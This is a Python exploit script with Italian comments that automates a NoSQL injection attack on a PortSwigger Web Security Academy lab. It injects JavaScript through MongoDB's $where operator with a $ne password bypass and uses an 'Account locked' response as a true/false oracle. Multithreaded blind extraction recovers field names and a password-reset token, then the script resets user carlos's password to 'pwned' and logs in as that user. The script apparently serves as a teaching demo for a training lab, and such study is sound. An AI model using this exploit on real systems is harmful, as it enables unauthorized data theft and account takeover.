import requests, string, time, sys
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console; from rich.panel import Panel
from rich.live import Live; from rich.text import Text
from rich.prompt import IntPrompt; from rich import box
import typer, urllib3, random

urllib3.disable_warnings()
console = Console()
app = typer.Typer(add_completion=False)

class NoSQLExploit:
    def __init__(self, lab_id):
        self.url = f"https://{lab_id}.web-security-academy.net"
        self.sess = requests.Session()
        self.sess.verify = False
        self.chars = [] # Buffer per la visualizzazione Matrix
        self.stop = False # Flag per fermare i thread

    # --- PUNTO CHIAVE 1: L'INIEZIONE ---
    # Spiegazione: "Sfruttiamo l'operatore $where per iniettare JavaScript nel motore NoSQL."
    # Se l'espressione è VERA, il server risponde diversamente (es. Account Locked).
    def check(self, payload):
        try:
            r = self.sess.post(f"{self.url}/login", json={
                "username": "carlos",
                "password": {"$ne": "invalid"}, # Bypass password standard
                "$where": payload               # <--- PAYLOAD JAVASCRIPT
            }, timeout=3)
            return "Account locked" in r.text   # Oracolo Booleano (Vero/Falso)
        except: return False

    # --- PUNTO CHIAVE 2: L'AUTOMAZIONE (Il "Cracking") ---
    # Spiegazione: "Estraiamo i dati in due fasi: prima la lunghezza, poi i caratteri in parallelo."
    def crack(self, length_check, char_check, desc):
        # 1. Trova Lunghezza
        length = 0
        with console.status(f"[yellow]Analisi lunghezza: {desc}...", spinner="dots"):
            for i in range(1, 51):
                if self.check(length_check % i): # Prova: "lunghezza == 1?", "lunghezza == 2?"...
                    length = i; break
        
        if not length: return None

        # 2. Estrai Caratteri (Multithreading)
        self.chars = [None] * length
        self.stop = False
        charset = string.ascii_letters + string.digits + "-_!{}"

        def worker(pos):
            # Mischia charset per variare i pattern (effetto grafico)
            shuffled = list(charset); random.shuffle(shuffled)
            for char in shuffled:
                if self.stop or self.chars[pos]: return
                # Prova: "Il carattere alla posizione X è Y?"
                if self.check(char_check % (pos, char)):
                    self.chars[pos] = char; return

        # Visualizzazione
        with Live(refresh_per_second=10) as live, ThreadPoolExecutor(max_workers=10) as ex:
            for i in range(length): ex.submit(worker, i)
            
            while not self.stop:
                # Genera stringa: Verde se trovato, Bianco random se mancante
                display = Text(f"{desc}: ", style="cyan")
                found = 0
                for c in self.chars:
                    if c: display.append(c, "bold green"); found += 1
                    else: display.append(random.choice(string.ascii_letters), "dim white")
                
                live.update(display)
                if all(self.chars): self.stop = True
                time.sleep(0.05)
            live.update(display) # Stampa finale pulita
            
        return "".join(self.chars)

    # --- FLUSSO PRINCIPALE ---
    def run(self):
        console.clear()
        console.print(Panel.fit("[bold magenta]NoSQL Injection - Demo[/bold magenta]", border_style="magenta"))
        
        # 0. Setup
        if self.sess.get(self.url).status_code != 200: return console.print("[red]Lab Down[/red]")
        self.reset_lab() 

        # 1. Scansione DB (enumerare i campi presenti)
        console.rule("[cyan]FASE 1: MAPPING DATABASE[/cyan]")
        found_fields = {}

        for i in range(10):
            if not self.check(f"Object.keys(this).length > {i}"): break
            
            # Trova nome campo: Funziona in parallelo, ogni campo trova la stringa nell'indice i
            name = self.crack(
                f"Object.keys(this)[{i}].length == %d",         # Payload Lunghezza
                f"Object.keys(this)[{i}].match('^.{{%d}}%s.*')", # Payload Carattere (Regex)
                f"Campo {i}"
            )
            if name: found_fields[str(i)] = name; console.print(f"   [green]✔ Trovato:[/green] {name}")

        # 2. L'untete selezione il campo target da input
        console.print()
        target_idx = IntPrompt.ask("Quale campo contiene il token?", choices=list(found_fields.keys()))
        target_name = found_fields[str(target_idx)]

        # 3. Estrazione Token: Funziona in parallelo, ogni campo trova la stringa nell'indice i
        self.reset_lab()
        console.rule(f"[cyan]FASE 2: DECRYPTING {target_name.upper()}[/cyan]")
        token = self.crack(
            f"this.{target_name}.length == %d",        # Payload Lunghezza Valore
            f"this.{target_name}.match('^.{{%d}}%s.*')", # Payload Carattere Valore
            "Token"
        )

        # 4. Takeover
        if token: self.takeover(target_name, token)

    def takeover(self, field, token):
        console.rule("[cyan]FASE 3: ACCOUNT TAKEOVER[/cyan]")
        # Recupera CSRF per il form
        csrf = self.get_csrf(f"{self.url}/forgot-password?{field}={token}")
        if not csrf: return console.print("[red]Errore CSRF[/red]")

        # Esegue il reset della password usando il token trovato
        self.sess.post(f"{self.url}/forgot-password", data={
            "csrf": csrf, "username": "carlos", "new-password-1": "pwned", "new-password-2": "pwned", field: token
        })
        console.print(Panel("[bold white]✔ Password Resettata![/bold white]", style="on green"))
        time.sleep(1)

        # Login Finale
        self.sess.post(f"{self.url}/login", json={"username": "carlos", "password": "pwned"})
        if "Log out" in self.sess.get(f"{self.url}/my-account").text:
            console.print(Panel("[bold green]ACCESSO CARLOS RIUSCITO![/bold green]\nPass: pwned", title="WIN"))
        else:
            console.print("[yellow]Verifica login fallita[/yellow]")

    def reset_lab(self):
        t = self.get_csrf(f"{self.url}/forgot-password")
        if t: self.sess.post(f"{self.url}/forgot-password", data={"csrf": t, "username": "carlos"})

    def get_csrf(self, u):
        try:
            from lxml import html
            return html.fromstring(self.sess.get(u).content).xpath('//input[@name="csrf"]/@value')[0]
        except: return None

@app.command()
def main(id: str):
    # Pulisce l'ID se l'utente incolla l'URL intero
    clean_id = id.replace("https://", "").split(".")[0]
    NoSQLExploit(clean_id).run()

if __name__ == "__main__": app()